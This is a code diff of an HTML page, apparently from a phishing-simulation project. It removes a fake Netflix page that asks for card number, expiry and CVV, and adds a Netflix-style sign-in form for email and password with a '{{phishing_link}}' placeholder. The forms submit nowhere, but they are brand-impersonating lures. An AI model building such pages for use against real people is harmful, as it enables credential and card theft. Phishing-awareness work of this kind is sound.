@@ -1,127 +1,50 @@
+<style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      width: 100%;
+    }
+  </style>
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Update Payment Details - Netflix</title>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f4f4f4;
-        }
-        .container {
-            width: 100%;
-            max-width: 700px;
-            margin: 0 auto;
-            padding: 30px;
-            background-color: #ffffff;
-            border-radius: 8px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
-            margin-top: 100px;
-        }
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        .header img {
-            width: 150px;
-            margin-bottom: 5px;
-        }
-        .heading {
-            color: #E50914;
-            font-size: 28px;
-            font-weight: bold;
-            margin-bottom: 20px;
-        }
-        .subheading {
-            font-size: 18px;
-            color: #333;
-            line-height: 1.6;
-            margin-bottom: 20px;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        .form-group label {
-            font-size: 14px;
-            color: #333;
-            display: block;
-            margin-bottom: 5px;
-        }
-        .form-group input {
-    width: 100%;
-    padding: 8px; /* Reduced padding */
-    border: 1px solid #ddd;
-    border-radius: 4px;
-    font-size: 14px; /* Reduced font size */
-    background-color: #fafafa;
-}
-
-        .form-group input:focus {
-            border-color: #E50914;
-            outline: none;
-        }
-        .button {
-            display: inline-block;
-            background-color: #E50914;
-            color: white;
-            padding: 12px 20px;
-            font-size: 16px;
-            border-radius: 5px;
-            text-decoration: none;
-            width: 100%;
-            max-width: 300px;
-            text-align: center;
-            margin-top: 20px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-        .button:hover {
-            background-color: #b4070a;
-        }
-        .footer {
-            text-align: center;
-            font-size: 12px;
-            color: #999;
-            margin-top: 30px;
-        }
-        .footer a {
-            color: #E50914;
-            text-decoration: none;
-        }
-    </style>
+    <title>Netflix Landing Page</title>
 </head>
-<body>
-    <div class="container">
-        <div class="header">
-            <!-- Netflix logo -->
-            <img src="C:\Users\dell\OneDrive\Desktop\New folder\Netflix_Logo.png" alt="Netflix Logo">
-            <h1 class="heading">Update Your Payment Details</h1>
-        </div>
-        <div class="subheading">
-            <p>Your payment details are outdated, and we are unable to process your latest payment. Please update your payment method to continue enjoying Netflix.</p>
-        </div>
-        <form action="#" method="POST">
-            <div class="form-group">
-                <label for="credit-card">Credit or Debit Card Number</label>
-                <input type="text" id="credit-card" name="credit-card" placeholder="Enter your card number" required>
-            </div>
-            <div class="form-group">
-                <label for="expiry-date">Expiry Date (MM/YY)</label>
-                <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/YY" required>
-            </div>
-            <div class="form-group">
-                <label for="cvv">CVV</label>
-                <input type="text" id="cvv" name="cvv" placeholder="Enter your card's CVV" required>
-            </div>
-            <!-- Submit Button -->
-            <button type="submit" class="button">Update Payment Details</button>
-        </form>
-        <div class="footer">
-            <p>Need help? <a href="#">Contact Netflix Support</a></p>
+<div style="background: #000; margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif;">
+    <div style="position: relative; width: 100%; height: 100vh;">
+        <div style="content: ''; position: absolute; left: 0; top: 0; opacity: 0.5; width: 100%; height: 100%; background: url('C:\\Users\\dell\\OneDrive\\Desktop\\Holland Group Phishing Email Project\\Images\\netflix-bg.jpg'); background-position: center;"></div>
+        <nav style="position: fixed; padding: 25px 60px; z-index: 1;">
+            <a href="#"><img src="C:\Users\dell\OneDrive\Desktop\Holland Group Phishing Email Project\Images\netflix-logo.svg" alt="logo" style="width: 167px;"></a>
+        </nav>
+        <div style="position: absolute; left: 50%; top: 50%; border-radius: 4px; padding: 70px; width: 450px; transform: translate(-50%, -50%); background: rgba(0, 0, 0, 0.75);">
+            <h2 style="color: #fff; font-size: 2rem;">Sign In</h2>
+            <form action="#" style="margin: 25px 0 65px;">
+                <div style="height: 50px; position: relative; margin-bottom: 16px;">
+                    <input type="text" required style="height: 100%; width: 100%; background: #333; border: none; outline: none; border-radius: 4px; color: #fff; font-size: 1rem; padding: 0 20px;">
+                    <label style="position: absolute; left: 20px; top: 50%; transform: translateY(-50%); font-size: 1rem; pointer-events: none; color: #8c8c8c; transition: all 0.1s ease;">Email or phone number</label>
+                </div>
+                <div style="height: 50px; position: relative; margin-bottom: 16px;">
+                    <input type="password" required style="height: 100%; width: 100%; background: #333; border: none; outline: none; border-radius: 4px; color: #fff; font-size: 1rem; padding: 0 20px;">
+                    <label style="position: absolute; left: 20px; top: 50%; transform: translateY(-50%); font-size: 1rem; pointer-events: none; color: #8c8c8c; transition: all 0.1s ease;">Password</label>
+                </div>
+                <button type="submit" style="width: 100%; padding: 16px 0; font-size: 1rem; background: #e50914; color: #fff; font-weight: 500; border-radius: 4px; border: none; outline: none; margin: 25px 0 10px; cursor: pointer; transition: 0.1s ease;">Sign In</button>
+                <div style="display: flex; justify-content: space-between;">
+                    <div style="display: flex;">
+                        <input type="checkbox" id="remember-me" style="margin-right: 5px; accent-color: #b3b3b3;">
+                        <label for="remember-me" style="color: #b3b3b3; font-size: 0.9rem;">Remember me</label>
+                    </div>
+                    <a href="#" style="color: #b3b3b3; font-size: 0.9rem; text-decoration: none;">Need help?</a>
+                </div>
+            </form>
+            <p style="color: #b3b3b3;">New to Netflix? <a href="{{phishing_link}}" style="color: #fff; text-decoration: none;">Sign up now</a></p>
+            <small style="display: block; margin-top: 15px; color: #b3b3b3;">
+                This page is protected by Google reCAPTCHA to ensure you're not a bot. 
+                <a href="#" style="color: #0071eb;">Learn more.</a>
+            </small>
         </div>
     </div>
-</body>
+</div>
 </html>
